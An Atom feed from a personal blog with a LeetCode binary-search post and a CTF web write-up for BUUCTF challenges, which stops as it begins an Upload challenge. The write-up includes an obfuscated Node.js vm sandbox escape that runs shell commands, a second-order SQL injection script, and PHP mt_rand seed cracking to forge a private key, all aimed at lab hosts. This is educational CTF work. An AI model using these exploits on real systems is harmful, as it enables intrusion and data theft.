<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>D3n13d &#39;s blog</title>
  
  
  <link href="https://d3n13d.github.io/atom.xml" rel="self"/>
  
  <link href="https://d3n13d.github.io/"/>
  <updated>2022-02-11T09:25:50.705Z</updated>
  <id>https://d3n13d.github.io/</id>
  
  <author>
    <name>D3n13d</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Leetcode 20天算法刷题计划之算法入门</title>
    <link href="https://d3n13d.github.io/2022/02/11/Leetcode-20%E5%A4%A9%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%A1%E5%88%92%E4%B9%8B%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"/>
    <id>https://d3n13d.github.io/2022/02/11/Leetcode-20%E5%A4%A9%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%A1%E5%88%92%E4%B9%8B%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/</id>
    <published>2022-02-11T08:18:43.000Z</published>
    <updated>2022-02-11T09:25:50.705Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>学他妈的</p></blockquote><h2 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704. 二分查找"></a><a href="https://leetcode-cn.com/problems/binary-search/">704. 二分查找</a></h2><p>​    题目：给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。</p><p>​    二分查找的前提：</p><ul><li><p>有序数组</p></li><li><p>无重复元素</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><pre><code class="hljs python">nums=[-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>]<br>target=<span class="hljs-number">9</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:</span><br>        nums=nums<br>        target=target<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-comment">#classmethod 可以不用实例化类直接调用</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self,target,nums</span>) -&gt; <span class="hljs-built_in">int</span>:</span><br>        low, high = <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(nums) - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> low&lt;=high:  <br>            mid=(low+high)//<span class="hljs-number">2</span><br>            <span class="hljs-keyword">if</span> nums[mid]==target:<br>                <span class="hljs-keyword">return</span> mid<br>            <span class="hljs-keyword">if</span> nums[mid]&lt;target:<br>                low=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> nums[mid]&gt;target:<br>                high=mid<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>           <br>result=Solution.search(target,nums)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="278-第一个错误的版本"><a href="#278-第一个错误的版本" class="headerlink" title="278. 第一个错误的版本"></a><a href="https://leetcode-cn.com/problems/first-bad-version/">278. 第一个错误的版本</a></h2><p>​    题目：你是产品经理，目前正在带领一个团队开发新的产品。不幸的是，你的产品的最新版本没有通过质量检测。由于每个版本都是基于之前的版本开发的，所以错误的版本之后的所有版本都是错的。假设你有 n 个版本 [1, 2, …, n]，你想找出导致之后所有版本出错的第一个错误的版本。你可以通过调用 bool isBadVersion(version) 接口来判断版本号 version 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。你应该尽量减少对调用 API 的次数。</p><div class="code-wrapper"><pre><code class="hljs"> 这个还是可以用二分查找来看，是上一题的简化版算是，我没有在本地跑所以直接提交leetcode答案</code></pre></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">firstBadVersion</span>(<span class="hljs-params">self, n</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        :type n: int</span><br><span class="hljs-string">        :rtype: int</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        left = <span class="hljs-number">1</span><br>        right = n<br>        <span class="hljs-keyword">while</span> left &lt; right:<br>            mid = left + (right-left)//<span class="hljs-number">2</span><br>            <span class="hljs-keyword">if</span> isBadVersion(mid):<br>                right = mid<br>            <span class="hljs-keyword">else</span>:<br>                left = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> right<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="Python" scheme="https://d3n13d.github.io/categories/Python/"/>
    
    
    <category term="编程" scheme="https://d3n13d.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_web_第四页wp分享</title>
    <link href="https://d3n13d.github.io/2022/02/09/BUUCTF-web-%E7%AC%AC%E5%9B%9B%E9%A1%B5wp%E5%88%86%E4%BA%AB/"/>
    <id>https://d3n13d.github.io/2022/02/09/BUUCTF-web-%E7%AC%AC%E5%9B%9B%E9%A1%B5wp%E5%88%86%E4%BA%AB/</id>
    <published>2022-02-08T16:13:27.000Z</published>
    <updated>2022-02-08T16:15:29.946Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291537548.png" alt="image-20220129153717464"></p><p>run.php 负责运算结果 下面是源码，考虑到这里的话 真的是PHP嘛</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;code&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(code);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>在 JS中也有eval语句 同样python也有 先试试js</p><p>传入 <code>Error().stack </code>   <code>error.stack</code> 属性是描述代码中实例化 <code>Error</code> 的点的字符串。</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291605024.png" alt="image-20220129160554936"></p><p>看起来是vm虚拟机相关问题</p><p>exp:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">TypeError</span>[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span>f[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-built_in">Object</span>.preventExtensions(Buffer.from(<span class="hljs-string">``</span>)).a = <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">catch</span>(e)&#123;<br>        <span class="hljs-keyword">return</span> e[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="hljs-function">()=&gt;</span>&#123;&#125;).mainModule[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="hljs-string">`cat /flag`</span>).toString();<br>    &#125;<br>&#125;)()<br><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291611143.png" alt="image-20220129160936265"></p><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>注册用户登录后回显用户名，大概是二次注入</p><p>下面说一个mysql的例子</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022045299.png" alt="image-20220202204500141"></p><p>可以看到加了 hex()后原本为0的结果回显出来 解码结果为db1</p><p>但是这种情况可能会遇到截断</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022137899.png" alt="image-20220202213730833"></p><p>这时用双hex解决</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022139273.png" alt="image-20220202213935217"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> matplotlib.pyplot <span class="hljs-keyword">import</span> hexbin<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br>url=<span class="hljs-string">&#x27;http://d1212d0f-bbc4-44f6-9a4b-0c54ec8249a5.node4.buuoj.cn:81/&#x27;</span><br>url1=<span class="hljs-string">&#x27;http://d1212d0f-bbc4-44f6-9a4b-0c54ec8249a5.node4.buuoj.cn:81/login.php&#x27;</span><br>url2=<span class="hljs-string">&#x27;http://d1212d0f-bbc4-44f6-9a4b-0c54ec8249a5.node4.buuoj.cn:81/register.php&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):<br>payload=<span class="hljs-string">&quot;0&#x27;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for 10))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>+i*<span class="hljs-number">10</span>)<br><span class="hljs-comment">#print(payload)</span><br>data_reg =&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;test111111&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<span class="hljs-string">&quot;username&quot;</span>:payload, <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;123&quot;</span>&#125;<br>data_log =&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;test111111&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;123&quot;</span>&#125;<br>res1=requests.post(url2,data=data_reg)<br>time.sleep(<span class="hljs-number">1</span>)<br>res=requests.post(url1,data=data_log)<br>soup = BeautifulSoup(res.text,<span class="hljs-string">&#x27;html.parser&#x27;</span>) <br><span class="hljs-built_in">print</span>(soup.span.text)<br><span class="hljs-comment"># flag=int(soup.span.text,16)</span><br><span class="hljs-comment"># flag=int(soup.span.text,16)</span><br><span class="hljs-comment"># print(str(flag))</span><br><br><span class="hljs-comment">#str=str+&#x27;,&#x27;+soup.span.text</span><br><span class="hljs-comment">#print(str)</span><br><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-comment"># import sleep</span><br><br>url = <span class="hljs-string">&quot;http://e7b9349a-1ea8-4917-b77e-af4edcb3e1a0.node4.buuoj.cn:81/index.php &quot;</span><br>s = requests.session()   <span class="hljs-comment">#保持会话</span><br>rr = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;[0-9]+ [+|-] [0-9]+&quot;</span>)<br><br>r = s.get(url)<br>r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>data = &#123;<span class="hljs-string">&quot;answer&quot;</span>:<span class="hljs-built_in">eval</span>(rr.findall(r.text)[<span class="hljs-number">0</span>])&#125;  <span class="hljs-comment">#计算</span><br>r = s.post(url,data=data)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1001</span>):<br>answer = <span class="hljs-built_in">eval</span>(rr.findall(r.text)[<span class="hljs-number">0</span>])<br>data = &#123; <span class="hljs-string">&quot;answer&quot;</span> : answer &#125;<br>sleep(<span class="hljs-number">0.5</span>)<br>r = s.post( url , data=data)<br>r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+%d]:&#x27;</span>%(i) + <span class="hljs-built_in">str</span>(answer))<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291909316.png" alt="image-20220129190931210"></p><p>没啥思路去找源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$Private_key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$username</span> == <span class="hljs-string">&#x27;&#x27;</span>) || (<span class="hljs-variable">$password</span> == <span class="hljs-string">&#x27;&#x27;</span>) ||(<span class="hljs-variable">$Private_key</span> == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        <span class="hljs-variable">$getuser</span> = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        <span class="hljs-variable">$link</span>=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$link</span>);<br>        <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$getuser</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysql_fetch_assoc(<span class="hljs-variable">$result</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-comment">// genarate public_key </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= substr(<span class="hljs-variable">$strings1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>  &#125;<br><br>  <span class="hljs-comment">//genarate private_key</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= substr(<span class="hljs-variable">$strings2</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>  &#125;<br>  <span class="hljs-variable">$Public_key</span> = public_key();<br>  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></code></pre></td></tr></table></figure><p>两个生成秘钥的函数 然后前面就是验证秘钥的</p><p>因为 有 mt_rand 这题大概率还是考察伪随机数</p><p>转换为 php_mt_send 可用参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">str1 =<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span><br>str2 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br>res =<span class="hljs-string">&#x27;&#x27;</span><br>length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(str2)-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str1)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str2)):<br>        <span class="hljs-keyword">if</span> str1[i] ==  str2[j]:<br>            res += <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> +<span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + length + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(res)<br><br></code></pre></td></tr></table></figure><p>获取种子</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201292119597.png" alt="image-20220129211942474"></p><p>重新生成秘钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">1775196155</span>);<br><span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">16</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= substr(<span class="hljs-variable">$strings1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$public_key</span>. <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br><span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">12</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= substr(<span class="hljs-variable">$strings2</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$private_key</span>;<br><span class="hljs-comment">//KVQP0LdJKRaV3n9D&lt;br&gt;XuNhoueCDCGc</span><br><br></code></pre></td></tr></table></figure><p>注意这里要使用 5.2.1 -7.0.X的版本 你可以使用phpstudy安装旧版本php 然后进文件夹用那个php跑</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201292131105.png" alt="image-20220129213104053"></p><h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>注册一个账号可以看出是ThinkPHP的框架</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202011004525.png" 